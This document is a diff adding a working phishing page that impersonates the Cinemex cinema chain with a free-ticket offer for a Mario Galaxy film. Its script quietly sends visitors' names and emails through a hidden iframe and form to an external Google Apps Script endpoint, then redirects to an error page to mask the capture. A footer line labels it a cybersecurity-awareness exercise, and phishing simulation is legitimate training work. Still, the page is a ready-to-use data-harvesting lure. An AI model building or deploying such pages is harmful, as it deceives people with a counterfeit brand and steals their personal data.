@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cinemex | Promoción Especial Mario Galaxy</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Helvetica Neue', Arial, sans-serif;
+            background: radial-gradient(circle, #001d4a 0%, #000000 100%);
+            color: white;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+        nav {
+            background-color: #cf0000;
+            padding: 15px 50px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.5);
+        }
+        .hero {
+            flex: 1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 40px 20px;
+            background-image: linear-gradient(rgba(0,0,0,0.6), rgba(0,0,0,0.6)), url('https://via.placeholder.com/1920x1080?text=Mario+Galaxy+Background');
+            background-size: cover;
+            background-position: center;
+        }
+        .promo-card {
+            background: rgba(255, 255, 255, 0.95);
+            color: #333;
+            padding: 40px;
+            border-radius: 20px;
+            max-width: 450px;
+            width: 100%;
+            text-align: center;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+        }
+        .promo-card h2 { color: #cf0000; margin-bottom: 10px; }
+        .input-group { margin: 15px 0; text-align: left; }
+        label { display: block; margin-bottom: 5px; font-size: 14px; font-weight: bold; }
+        input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ccc;
+            border-radius: 8px;
+            box-sizing: border-box;
+        }
+        .cta-button {
+            background-color: #cf0000;
+            color: white;
+            border: none;
+            padding: 15px 40px;
+            font-size: 18px;
+            font-weight: bold;
+            border-radius: 50px;
+            cursor: pointer;
+            width: 100%;
+            margin-top: 20px;
+            transition: transform 0.2s;
+            display: block;
+            text-decoration: none;
+            text-align: center;
+            box-sizing: border-box;
+        }
+        .cta-button:hover { transform: scale(1.03); }
+        footer {
+            background-color: #1a1a1a;
+            padding: 30px 50px;
+            font-size: 12px;
+            color: #888;
+            text-align: center;
+        }
+        .footer-links { margin-bottom: 15px; }
+        .footer-links a { color: #888; text-decoration: none; margin: 0 10px; }
+        .footer-links a:hover { text-decoration: underline; }
+    </style>
+</head>
+<body>
+ 
+    <nav>
+        <div class="logo-placeholder">Cinemex</div>
+        <div style="font-size: 14px;">Cartelera | Promociones | Invitado Especial</div>
+    </nav>
+ 
+    <section class="hero">
+        <div class="promo-card">
+            <img src="logo.png" alt="Logo Cinemex" style="width:180px; margin-bottom:20px;">
+            <h2>¡BOLETOS GRATIS!</h2>
+            <p>Sé de los primeros en viajar por el cosmos con Mario. Completa el registro para obtener tu acceso doble.</p>
+ 
+            <div class="input-group">
+                <label>Nombre del Invitado Especial</label>
+                <input type="text" id="nombre" placeholder="Ej. Juan Pérez">
+            </div>
+            <div class="input-group">
+                <label>Correo Electrónico</label>
+                <input type="email" id="correo" placeholder="tu@correo.com">
+            </div>
+            <button class="cta-button" id="btn" onclick="enviarDatos()">OBTENER MIS BOLETOS</button>
+            <p style="font-size: 11px; margin-top: 15px; color: #999;">*Válido solo para funciones en formato 2D y 3D.</p>
+        </div>
+    </section>
+ 
+    <footer>
+        <div class="footer-links">
+            <a href="#">Aviso de Privacidad</a> | 
+            <a href="#">Términos y Condiciones</a> | 
+            <a href="#">Contacto</a> | 
+            <a href="#">Bolsa de Trabajo</a>
+        </div>
+        <p>Cinemex® es una marca registrada de Grupo Cinemex, S.A. de C.V. 2026.</p>
+        <p>Esta página es parte de un ejercicio de concientización de Ciberseguridad. No ingreses datos reales.</p>
+    </footer>
+ 
+    <script>
+        const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbwjejEUQlCIUgCZWUvgzNfXm1ECowHrBkgNNkqxuKCwD_4fPgkHByqVCzTxXJ-brq53Jg/exec";
+ 
+        function enviarDatos() {
+            const nombre = document.getElementById('nombre').value.trim();
+            const correo = document.getElementById('correo').value.trim();
+ 
+            if (!nombre || !correo) {
+                alert('Por favor completa todos los campos.');
+                return;
+            }
+ 
+            // Enviar datos usando un iframe oculto (funciona desde file://)
+            const iframe = document.createElement('iframe');
+            iframe.style.display = 'none';
+            iframe.name = 'hidden_iframe';
+            document.body.appendChild(iframe);
+ 
+            const form = document.createElement('form');
+            form.method = 'POST';
+            form.action = SCRIPT_URL;
+            form.target = 'hidden_iframe';
+ 
+            const addField = (name, value) => {
+                const input = document.createElement('input');
+                input.type = 'hidden';
+                input.name = name;
+                input.value = value;
+                form.appendChild(input);
+            };
+ 
+            addField('nombre', nombre);
+            addField('correo', correo);
+ 
+            document.body.appendChild(form);
+            form.submit();
+ 
+            // Redirigir inmediatamente
+            setTimeout(() => {
+                window.location.href = 'error.html';
+            }, 500);
+        }
+    </script>
+ 
+</body>
+</html>
+ 
